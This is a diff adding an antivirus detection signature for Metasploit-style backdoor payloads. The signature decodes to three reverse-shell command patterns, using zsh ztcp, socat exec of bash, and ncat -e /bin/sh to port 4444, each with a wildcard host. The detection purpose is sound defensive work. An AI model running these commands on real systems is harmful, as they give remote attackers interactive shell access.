@@ -1,0 +1,18 @@
+VIRUS NAME: Txt.Backdoor.MetasploitPayload-9874939-0
+TDB: Engine:81-255,FileSize:10-1000,Target:7
+LOGICAL EXPRESSION: 0|1|2
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NOCASE
+ +-> DECODED SUBSIGNATURE:
+zsh -c 'zmodload zsh/net/tcp && ztcp {WILDCARD_ANY_STRING(LENGTH<=30)} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NOCASE
+ +-> DECODED SUBSIGNATURE:
+socat udp-connect:{WILDCARD_ANY_STRING(LENGTH<=30)} exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NOCASE
+ +-> DECODED SUBSIGNATURE:
+ncat -e /bin/sh --ssl {WILDCARD_ANY_STRING(LENGTH<=20)} 4444
